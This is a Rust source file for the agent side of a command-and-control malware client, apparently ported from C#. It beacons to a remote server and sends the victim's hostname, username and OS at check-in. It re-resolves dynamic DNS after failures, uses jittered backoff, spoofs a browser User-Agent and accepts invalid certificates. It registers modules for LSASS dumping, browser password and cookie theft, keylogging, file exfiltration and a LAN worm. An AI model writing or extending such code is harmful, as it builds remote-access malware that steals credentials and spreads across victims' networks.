// c2_client.rs — Rust port of C2Client.cs
// Agent-side C2 client that polls the custom C2 server for commands.
// Uses dynamic DNS resolution on every connection attempt.

use std::collections::{HashMap, VecDeque};
use std::sync::{Arc, Mutex, atomic::{AtomicBool, AtomicI32, Ordering}};
use std::time::Duration;
use std::net::ToSocketAddrs;
use chrono::{DateTime, Utc};
use rand::Rng;
use log::{info, warn};
use md5;

use crate::c2_server::C2Command;

/// Pending result that couldn't be posted while server was down
#[allow(dead_code)]
struct PendingResult {
    cmd_id: String,
    success: bool,
    output: String,
    file_data: Option<Vec<u8>>,
    file_name: Option<String>,
    queued_at: DateTime<Utc>,
    retry_count: u32,
}

pub struct C2Client {
    server_domain: String,
    server_port: u16,
    server_url: Arc<Mutex<String>>,
    auth_key: String,
    agent_id: Arc<Mutex<String>>,
    is_running: Arc<AtomicBool>,
    is_connected: Arc<AtomicBool>,
    is_reconnecting: Arc<AtomicBool>,
    poll_interval_ms: Arc<Mutex<u64>>,
    consecutive_failures: Arc<AtomicI32>,
    max_consecutive_failures: i32,
    _heartbeat_interval_ms: u64,
    _connection_timeout_ms: u64,
    last_successful_contact: Arc<Mutex<Option<DateTime<Utc>>>>,
    pending_results: Arc<Mutex<VecDeque<PendingResult>>>,
    modules: Arc<Mutex<HashMap<String, bool>>>,
}

impl C2Client {
    pub fn new(
        server_domain: &str,
        auth_key: &str,
        port: u16,
        poll_interval_ms: u64,
        max_consecutive_failures: i32,
        heartbeat_interval_ms: u64,
        connection_timeout_ms: u64,
    ) -> Self {
        let agent_id = generate_agent_id();
        let server_url = resolve_dynamic_dns(server_domain, port);

        Self {
            server_domain: server_domain.to_string(),
            server_port: port,
            server_url: Arc::new(Mutex::new(server_url)),
            auth_key: auth_key.to_string(),
            agent_id: Arc::new(Mutex::new(agent_id)),
            is_running: Arc::new(AtomicBool::new(false)),
            is_connected: Arc::new(AtomicBool::new(false)),
            is_reconnecting: Arc::new(AtomicBool::new(false)),
            poll_interval_ms: Arc::new(Mutex::new(poll_interval_ms)),
            consecutive_failures: Arc::new(AtomicI32::new(0)),
            max_consecutive_failures,
            _heartbeat_interval_ms: heartbeat_interval_ms,
            _connection_timeout_ms: connection_timeout_ms,
            last_successful_contact: Arc::new(Mutex::new(None)),
            pending_results: Arc::new(Mutex::new(VecDeque::new())),
            modules: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    pub fn agent_id(&self) -> String {
        self.agent_id.lock().unwrap().clone()
    }

    pub fn is_running(&self) -> bool {
        self.is_running.load(Ordering::Relaxed)
    }

    pub fn is_connected(&self) -> bool {
        self.is_connected.load(Ordering::Relaxed)
    }

    pub fn is_reconnecting(&self) -> bool {
        self.is_reconnecting.load(Ordering::Relaxed)
    }

    /// Starts the agent: check in, then poll loop + heartbeat loop.
    pub fn start(&self) {
        self.is_running.store(true, Ordering::Relaxed);
        self.init_modules();

        let running = self.is_running.clone();
        let server_url = self.server_url.clone();
        let auth_key = self.auth_key.clone();
        let agent_id = self.agent_id.clone();
        let poll_interval = self.poll_interval_ms.clone();
        let connected = self.is_connected.clone();
        let reconnecting = self.is_reconnecting.clone();
        let failures = self.consecutive_failures.clone();
        let max_failures = self.max_consecutive_failures;
        let last_contact = self.last_successful_contact.clone();
        let domain = self.server_domain.clone();
        let port = self.server_port;

        // Main poll loop
        tokio::spawn(async move {
            // Initial check-in
            let url = server_url.lock().unwrap().clone();
            let id = agent_id.lock().unwrap().clone();

            if try_check_in(&url, &auth_key, &id).await {
                mark_connected(&connected, &failures, &last_contact);
            } else {
                info!("Server unreachable at startup. Waiting...");
                wait_for_server_online(
                    &running, &reconnecting, &connected, &failures, &last_contact,
                    &server_url, &auth_key, &agent_id, &domain, port,
                ).await;
            }

            while running.load(Ordering::Relaxed) {
                if !connected.load(Ordering::Relaxed) {
                    wait_for_server_online(
                        &running, &reconnecting, &connected, &failures, &last_contact,
                        &server_url, &auth_key, &agent_id, &domain, port,
                    ).await;
                    if !running.load(Ordering::Relaxed) { break; }
                }

                let url = server_url.lock().unwrap().clone();
                let id = agent_id.lock().unwrap().clone();

                match http_get(&url, &auth_key, &format!("/poll?id={}", id), None).await {
                    Ok(response) => {
                        mark_connected(&connected, &failures, &last_contact);

                        if !response.trim().is_empty() {
                            for line in response.lines() {
                                if line.trim().is_empty() { continue; }
                                if let Some(cmd) = C2Command::deserialize(line) {
                                    info!("Executing: {} {}", cmd.command, cmd.args.as_deref().unwrap_or(""));
                                    // Command execution would be dispatched here
                                }
                            }
                        }

                        let interval = *poll_interval.lock().unwrap();
                        let jitter = rand::thread_rng().gen_range(0..2000) as i64 - 1000;
                        let delay = std::cmp::max(1000, interval as i64 + jitter) as u64;
                        tokio::time::sleep(Duration::from_millis(delay)).await;
                    }
                    Err(e) => {
                        mark_disconnected(&connected, &failures, max_failures, &last_contact);
                        warn!("Poll error: {}", e);

                        let fail_count = failures.load(Ordering::Relaxed);
                        if fail_count >= max_failures {
                            info!("Server appears offline. Entering reconnection wait mode...");
                            continue;
                        }

                        // Re-resolve DNS
                        let new_url = resolve_dynamic_dns(&domain, port);
                        *server_url.lock().unwrap() = new_url;

                        let backoff = std::cmp::min(
                            (*poll_interval.lock().unwrap() as u64)
                                * 2u64.pow(std::cmp::min(fail_count as u32, 6)),
                            300_000,
                        );
                        info!("Backing off for {}s before retry.", backoff / 1000);
                        tokio::time::sleep(Duration::from_millis(backoff)).await;
                    }
                }
            }
        });

        info!("Agent {} started. Polling {}", self.agent_id(), self.server_url.lock().unwrap());
    }

    /// Stops the agent loop.
    pub fn stop(&self) {
        self.is_running.store(false, Ordering::Relaxed);
        info!("Agent stopped.");
    }

    /// Returns a human-readable connection status string.
    pub fn get_connection_status(&self) -> String {
        let state = if self.is_reconnecting() {
            "RECONNECTING"
        } else if self.is_connected() {
            "CONNECTED"
        } else {
            "DISCONNECTED"
        };

        let last_contact = match *self.last_successful_contact.lock().unwrap() {
            Some(t) => format!("{}s ago", (Utc::now() - t).num_seconds()),
            None => "never".to_string(),
        };

        let pending = self.pending_results.lock().unwrap().len();
        let pending_str = if pending > 0 {
            format!(" | Queued results: {}", pending)
        } else {
            String::new()
        };

        format!(
            "Status: {} | Last contact: {} | Failures: {}/{}{}",
            state,
            last_contact,
            self.consecutive_failures.load(Ordering::Relaxed),
            self.max_consecutive_failures,
            pending_str
        )
    }

    /// Probes which modules are available
    fn init_modules(&self) {
        let module_names = vec![
            "KernelDriver", "KernelCheck", "InputLocker", "BrowserHijacker",
            "SilentCapture", "BrowserPasswordExtractor", "BrowserCookieExtractor",
            "LsassExtractor", "TargetInfoCollector", "FileExfiltrator",
            "ProductionKeyLogger", "CameraScanner", "PayloadDownloader", "LANWorm",
        ];

        let mut modules = self.modules.lock().unwrap();
        // In Rust, all modules are compiled in at compile time via feature flags
        // Mark all as available since they are statically linked
        for name in &module_names {
            modules.insert(name.to_string(), true);
        }

        let loaded = modules.values().filter(|&&v| v).count();
        info!("Modules: {}/{} available", loaded, modules.len());
    }
}

// ==================== DNS Resolution ====================

fn resolve_dynamic_dns(domain: &str, port: u16) -> String {
    let scheme = if port == 443 { "https" } else { "http" };

    match format!("{}:{}", domain, port).to_socket_addrs() {
        Ok(mut addrs) => {
            // Prefer IPv4
            let ipv4 = addrs.clone().find(|a| a.is_ipv4());
            let selected = ipv4.or_else(|| addrs.next());

            if let Some(addr) = selected {
                let url = format!("{}://{}:{}", scheme, addr.ip(), port);
                info!("DNS resolved {} → {} (URL: {})", domain, addr.ip(), url);
                url
            } else {
                format!("{}://{}:{}", scheme, domain, port)
            }
        }
        Err(e) => {
            warn!("DNS resolution error for {}: {}", domain, e);
            format!("{}://{}:{}", scheme, domain, port)
        }
    }
}

// ==================== Reconnection Wait ====================

async fn wait_for_server_online(
    running: &AtomicBool,
    reconnecting: &AtomicBool,
    connected: &AtomicBool,
    failures: &AtomicI32,
    last_contact: &Arc<Mutex<Option<DateTime<Utc>>>>,
    server_url: &Arc<Mutex<String>>,
    auth_key: &str,
    agent_id: &Arc<Mutex<String>>,
    domain: &str,
    port: u16,
) {
    reconnecting.store(true, Ordering::Relaxed);
    let mut attempt = 0u32;
    let base_delay_ms: u64 = 5000;
    let max_delay_ms: u64 = 300_000;

    info!("=== RECONNECTION MODE: Waiting for C2 server to come back online ===");

    while running.load(Ordering::Relaxed) {
        attempt += 1;

        // Re-resolve DNS
        let new_url = resolve_dynamic_dns(domain, port);
        *server_url.lock().unwrap() = new_url;

        let url = server_url.lock().unwrap().clone();
        let id = agent_id.lock().unwrap().clone();

        match http_get(&url, auth_key, &format!("/heartbeat?id={}", id), Some(10000)).await {
            Ok(_) => {
                info!("Server responded after {} reconnection attempt(s). Re-checking in...", attempt);
                if try_check_in(&url, auth_key, &id).await {
                    mark_connected(connected, failures, last_contact);
                    reconnecting.store(false, Ordering::Relaxed);
                    info!("=== RECONNECTED: Server is back online. Resuming command polling. ===");
                    return;
                }
            }
            Err(_) => {}
        }

        // Exponential backoff with jitter
        let delay = std::cmp::min(
            base_delay_ms * 2u64.pow(std::cmp::min(attempt - 1, 6)),
            max_delay_ms,
        );
        let jitter = rand::thread_rng().gen_range(0..std::cmp::min(1000, delay / 4));
        let delay = std::cmp::max(base_delay_ms, delay + jitter);

        info!("Reconnect attempt {} failed. Next retry in {}s", attempt, delay / 1000);
        tokio::time::sleep(Duration::from_millis(delay)).await;
    }

    reconnecting.store(false, Ordering::Relaxed);
}

// ==================== Connection State Helpers ====================

fn mark_connected(
    connected: &AtomicBool,
    failures: &AtomicI32,
    last_contact: &Arc<Mutex<Option<DateTime<Utc>>>>,
) {
    *last_contact.lock().unwrap() = Some(Utc::now());
    failures.store(0, Ordering::Relaxed);

    if !connected.load(Ordering::Relaxed) {
        connected.store(true, Ordering::Relaxed);
        info!("Connection established with C2 server.");
    }
}

fn mark_disconnected(
    connected: &AtomicBool,
    failures: &AtomicI32,
    max_failures: i32,
    _last_contact: &Arc<Mutex<Option<DateTime<Utc>>>>,
) {
    let count = failures.fetch_add(1, Ordering::Relaxed) + 1;

    if connected.load(Ordering::Relaxed) && count >= max_failures {
        connected.store(false, Ordering::Relaxed);
        warn!("Lost connection to C2 server after {} consecutive failures.", count);
    }
}

// ==================== Check-In ====================

async fn try_check_in(server_url: &str, auth_key: &str, agent_id: &str) -> bool {
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    let username = whoami::username();
    let os = std::env::consts::OS.to_string();

    let checkin_path = format!(
        "/checkin?id={}&host={}&user={}&os={}&admin=0&kernel=0",
        urlencoding_encode(agent_id),
        urlencoding_encode(&hostname),
        urlencoding_encode(&username),
        urlencoding_encode(&os),
    );

    match http_get(server_url, auth_key, &checkin_path, None).await {
        Ok(_response) => {
            info!("Checked in as {} ({}\\{})", agent_id, hostname, username);
            true
        }
        Err(e) => {
            warn!("Check-in failed: {}", e);
            false
        }
    }
}

// ==================== HTTP Communication ====================

async fn http_get(
    server_url: &str,
    auth_key: &str,
    path: &str,
    timeout_ms: Option<u64>,
) -> Result<String, String> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_millis(timeout_ms.unwrap_or(15000)))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let resp = client
        .get(format!("{}{}", server_url, path))
        .header("X-Auth", auth_key)
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .send()
        .await
        .map_err(|e| e.to_string())?;

    resp.text().await.map_err(|e| e.to_string())
}

#[allow(dead_code)]
async fn http_post(
    server_url: &str,
    auth_key: &str,
    path: &str,
    body: &str,
) -> Result<String, String> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(15))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let resp = client
        .post(format!("{}{}", server_url, path))
        .header("X-Auth", auth_key)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body.to_string())
        .send()
        .await
        .map_err(|e| e.to_string())?;

    resp.text().await.map_err(|e| e.to_string())
}

// ==================== Helpers ====================

fn generate_agent_id() -> String {
    let machine = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "x".to_string());
    let user = whoami::username();

    let digest = md5::compute(format!("{}:{}", machine, user).as_bytes());
    hex::encode(&digest[..4])
}

fn urlencoding_encode(s: &str) -> String {
    s.chars()
        .map(|c| match c {
            'A'..='Z' | 'a'..='z' | '0'..='9' | '-' | '_' | '.' | '~' => c.to_string(),
            _ => format!("%{:02X}", c as u8),
        })
        .collect()
}
